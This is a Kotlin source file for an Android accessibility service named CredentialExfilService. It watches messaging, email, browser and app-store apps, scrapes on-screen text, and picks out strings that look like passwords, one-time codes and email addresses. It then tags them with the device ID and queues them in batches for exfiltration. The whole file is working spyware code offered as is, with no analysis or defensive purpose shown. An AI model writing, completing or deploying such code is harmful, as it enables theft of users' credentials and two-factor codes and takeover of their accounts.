package com.yourpackage.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.yourpackage.data.ExfilData
import com.yourpackage.utils.BatchManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class CredentialExfilService : AccessibilityService() {

    companion object {
        private const val TAG = "CredentialExfil"
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var batchManager: BatchManager

    // Renamed to avoid conflict with ContextWrapper.getDeviceId()
    private fun getUniqueDeviceId(): String {
        return Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown_device"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "✅ CredentialExfilService connected. Device ID: ${getUniqueDeviceId()}")

        batchManager = BatchManager { batch ->
            scope.launch {
                Log.d(TAG, "📦 Credential batch ready: ${batch.size} items")
            }
        }
        batchManager.start()

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        val packageName = event.packageName?.toString() ?: return
        if (!isTargetApp(packageName)) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                captureTextFromWindow(packageName)
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                captureFocusedText(event, packageName)
            }
        }
    }

    private fun captureTextFromWindow(packageName: String) {
        try {
            val root = rootInActiveWindow ?: return
            val texts = extractAllTexts(root)
            if (texts.isNotEmpty()) {
                val suspiciousTexts = texts.filter { text ->
                    isPassword(text) || isOtp(text) || isEmail(text)
                }

                if (suspiciousTexts.isNotEmpty()) {
                    val data = mapOf(
                        "type" to "credential",
                        "texts" to suspiciousTexts,
                        "app" to packageName
                    )
                    val exfilData = ExfilData(
                        type = "password",
                        app = packageName,
                        data = data.toString(),
                        device_id = getUniqueDeviceId()
                    )
                    batchManager.add(exfilData)
                    Log.d(TAG, "🔑 Captured credential from $packageName: ${suspiciousTexts.take(3)}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error capturing text from window: ${e.message}")
        }
    }

    private fun extractAllTexts(node: AccessibilityNodeInfo): List<String> {
        val texts = mutableListOf<String>()
        if (node.text != null) {
            texts.add(node.text.toString())
        }
        if (node.contentDescription != null) {
            texts.add(node.contentDescription.toString())
        }
        if (node.hintText != null) {
            texts.add(node.hintText.toString())
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                texts.addAll(extractAllTexts(child))
                child.recycle()
            }
        }
        return texts
    }

    private fun captureFocusedText(event: AccessibilityEvent, packageName: String) {
        try {
            val source = event.source ?: return
            val text = source.text?.toString() ?: return
            if (text.isNotEmpty()) {
                // Check if this is likely a password field
                if (isPassword(text) || isOtp(text)) {
                    val data = mapOf(
                        "type" to "focused_credential",
                        "text" to text,
                        "app" to packageName
                    )
                    val exfilData = ExfilData(
                        type = "password",
                        app = packageName,
                        data = data.toString(),
                        device_id = getUniqueDeviceId()
                    )
                    batchManager.add(exfilData)
                    Log.d(TAG, "🔑 Captured focused credential from $packageName: $text")
                }
            }
            source.recycle()
        } catch (e: Exception) {
            Log.e(TAG, "Error capturing focused text: ${e.message}")
        }
    }

    private fun isPassword(text: String): Boolean {
        return text.length in 4..32 && text.matches(Regex("^[a-zA-Z0-9!@#\$%^&*()_+=-]{4,32}$"))
    }

    private fun isOtp(text: String): Boolean {
        return text.matches(Regex("^\\d{6,8}$"))
    }

    private fun isEmail(text: String): Boolean {
        return text.matches(Regex("^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$"))
    }

    private fun isTargetApp(packageName: String): Boolean {
        return when (packageName) {
            "com.whatsapp",
            "com.instagram.android",
            "com.google.android.gm",
            "com.android.chrome",
            "org.telegram.messenger",
            "com.facebook.orca",
            "com.google.android.apps.messaging",
            "com.android.vending" -> true
            else -> false
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "⚠️ CredentialExfilService interrupted")
        batchManager.stop()
    }

    override fun onDestroy() {
        super.onDestroy()
        batchManager.stop()
        Log.d(TAG, "CredentialExfilService destroyed")
    }
}
